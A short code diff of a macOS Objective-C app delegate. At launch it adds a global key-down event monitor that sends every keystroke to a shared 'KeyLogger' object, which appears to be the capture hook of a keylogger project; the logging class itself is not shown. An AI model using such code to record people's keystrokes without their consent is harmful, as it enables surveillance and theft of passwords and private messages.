@@ -7,6 +7,8 @@
 //
 
 #import "AppDelegate.h"
+#import "Keys.h"
+
 
 @interface AppDelegate ()
 
@@ -15,8 +17,13 @@
 @implementation AppDelegate
 
 - (void)applicationDidFinishLaunching:(NSNotification *)aNotification {
-    // Insert code here to initialize your application
+//    [Keys sharedKeyLogger];
+    NSLog(@"and here");
+    //Notifications for key presses
+    [NSEvent addGlobalMonitorForEventsMatchingMask:NSKeyDownMask
+                                           handler:^ (NSEvent *event) {[[Keys sharedKeyLogger] handleKeyPress:event];}];
 }
+
 
 - (void)applicationWillTerminate:(NSNotification *)aNotification {
     // Insert code here to tear down your application
